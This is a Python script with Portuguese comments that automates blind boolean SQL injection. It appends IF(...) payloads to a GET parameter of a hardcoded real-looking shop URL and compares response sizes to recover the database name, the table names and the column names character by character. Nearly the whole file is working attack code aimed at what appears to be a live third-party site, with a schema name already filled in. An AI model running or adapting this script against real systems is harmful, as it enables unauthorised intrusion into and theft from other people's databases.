# ------------------------- * IMPORTS * -------------------------

import requests

# ------------------------- * I * -------------------------
# ..
def dbLength(url, content_length):
    i = 1
    db_length = 0

    while db_length == 0:
        new_url = url + f"%20and%20IF(length(database())={i},1,NULL)"
        response = requests.get(new_url)
        content = response.content
        content_length_new = len(content)

        if content_length_new == content_length:
            db_length = i
        else:
            i += 1
    
    return db_length

def dbContent(url, content_length, db_length, letras):

    i = 1
    db_name = []
    
    while i <= db_length:
        for letra in letras:
            new_url = url + f"%20and%20IF(SUBSTRING(database(),{i},1)='{letra}',1,NULL)"
            
            response = requests.get(new_url)
            content = response.content
            content_length_new = len(content)
            if content_length_new == content_length:
                db_name.append(letra)
                break
        i += 1
    else:
        print(f"letra nao encontrada para o array {i}")
    return db_name

def tbQtd(url, db_name, content_length):
    
    i=1
    content_length_new = 0

    while True:
        new_url = url + f"%20and%20if((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%20=%20%27gerencialnet%27)%20=%20{i},%201,%20NULL)"
        

        response = requests.get(new_url)
        content = response.content
        content_length_new = len(content)
        print(f"length = {content_length} \ lenghnew {content_length_new} \ testando {i}")
        if content_length_new != content_length:
            i += 1
        else:
            break

    print(f"qtd tables: {i}")
    return i


## F U N C A O  N A O  T E R M I N A D A

# def tbLength(url, content_length, qtd_tables, db_name):

#     i = 0
#     tb_length = []
    
#     while True:
#         i += 1
#         new_url = url + f"%20and%20IF((SELECT%20LENGTH(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%201)%20=%20{i},%201,%20NULL)"
#         response = requests.get(new_url)
#         content = response.content
#         content_length_new = len(content)
#         if content_length_new == content_length:
#             tb_length.append(i)
#             break    
#     for j in range(2,qtd_tables):
#         i = 1
#         while True:
#             i += 1
#             new_url = url + f"%20and%20IF((SELECT%20LENGTH(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}t%27%20LIMIT%20{j},1)%20=%20{i},%201,%20NULL)"
#             response = requests.get(new_url)
#             content = response.content
#             content_length_new = len(content) 
#             if content_length_new == content_length:
#                 tb_length.append(i)
#                 break
#     return tb_length
    
## F U N C A O  N A O  T E R M I N A D A 


def tbContent(url, db_name, content_length, letras, qtd_tables):
    
    array_tables = []
    k = 1
    l = 0
    limit: str = "1"
    while k < qtd_tables:
        i = 1
        j = 0
        tables = []
        while True:
            new_url = url + f"%20and%20IF(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{letras[j]}%27,%201,%20NULL)"
            response = requests.get(new_url)
            content = response.content
            content_length_new = len(content)
                
            if content_length_new == content_length:
                tables.append(letras[j])
                table_name = "".join(tables) 
                # print(f"testando letra {letra} no campo {i}, length = {content_length_new}")
                query = url + f"%20and%20IF((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{db_name}%27%20LIMIT%20{limit})=%27{table_name}%27,%201,%20NULL)"
                response = requests.get(query)
                content = response.content
                content_length_new = len(content)
                if content_length_new == content_length:
                    print(f"nome table: {table_name}")
                    array_tables.append(table_name.lower())
                    k += 1
                    limit = f"{k}, 1"
                    break
                else:     
                    i += 1
                    j = 0
            else:
                j += 1

    return array_tables

def clQtd(url, tb_name, content_length, qtd_tables):

    i = 1
    j = 0
    cl_length = []

    while j < qtd_tables:
        while True:
            new_url = url + f"%20and%20IF((select%20count(*)%20from%20information_schema.columns%20where%20table_name%20=%20%27{tb_name[j]}%27)={i},1,NULL)"
            response = requests.get(new_url)
            content = response.content
            content_length_new = len(content)
            ##DEBUG
            print(f"tantando tabela: {tb_name[j]} --- padrao//novo: {content_length}//{content_length_new}")
            if content_length_new != content_length:
                i += 1
            else:
                j += 1
                cl_length.append(i)
                break
    return cl_length

def clContent(url, content_length, letras, qtd_columns, tb_name, qtd_tables):
    
    array_columns = []
    j = 0
    k = 0
    l = 1
    m = 1
    while True:
        limit: str = "1"
        columns_names = []
        while k < qtd_columns[m]:
            j = 0
            i = 1
            columns = []
            while True:
                    new_url = url + f"%20and%20IF(SUBSTRING((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27{tb_name[l]}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{letras[j]}%27,%201,%20NULL)"
                    response = requests.get(new_url)
                    content = response.content
                    content_length_new = len(content)
                    
                    if content_length_new == content_length:
                        columns.append(letras[j])
                        column_name = "".join(columns) 
                        query = url + f"%20and%20IF((SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27{tb_name[l]}%27%20LIMIT%20{limit})=%27{column_name}%27,%201,%20NULL)"
                        response = requests.get(query)
                        content = response.content
                        content_length_new = len(content)
                        if content_length_new == content_length:
                            print(f"nome column: {column_name}")
                            columns_names.append(column_name.lower())
                            array_columns.append(columns_names)
                            k += 1
                            limit = f"{k}, 1"
                            break
                        else:     
                            i += 1
                            j = 0
                    else:
                        j += 1
        if m == qtd_tables:
            break
        else:
            l += 1
            m += 1
    return array_columns
            
                    
    
    
    
        
##VARIAVEIS
letras = ["A", "E", "O", "S", "R", "I", "N", "D", "M", "U",
          "T", "C", "L", "P", "V", "G", "H", "Q", "B", "F",
          "Z", "J", "X", "K", "W", "Y", "_", "-", ".", "0", "1",
          "2", "3", "4", "5", "6", "7", "8", "9", ":", "?",
          "@", "!", "#", "$", "%", "&", "*", "(", ")",
          "+", "="]


##url = input("Qual é a URL a ser verificada: ")

# ##DEBUG
# qtd_tables: int = 2
url = "https://www.adtecnet.com.br/produto.php?id=19"
# db_name = "gerencialnet"
# tb_name = ['cat', 'chat_adminrate']
# qtd_columns = [4, 6]
# ##FIM DEBUG 
database: str = 'database'

if '=' in url:
    print("Começando o Scanning.")
else:
    print("Verifique se a url contem o motedo GET.")

response = requests.get(url)

if response.status_code == 200:
        
        content = response.content
        content_length = len(content)
        print(f"{database:_^20}")

        db_length = dbLength(url, content_length)
        print(f'Tamanho do nome do banco: {db_length}')

        db_name = dbContent(url, content_length, db_length, letras)
        print(f"Nome do banco: {''.join(db_name).lower()}")

        qtd_tables = tbQtd(url, db_name, content_length)
        print(f"a quantidade de tabelas é: {qtd_tables}")

        tb_name = tbContent(url, db_name, content_length, letras, qtd_tables)
        print(f"Nome das tabelas: {tb_name}")

        qtd_columns = clQtd(url, tb_name, content_length, qtd_tables)

        cl_name = clContent(url, content_length, letras, qtd_columns, tb_name, qtd_tables)
        print(cl_name)
else:
    print("O servidor não respondeu :(") 
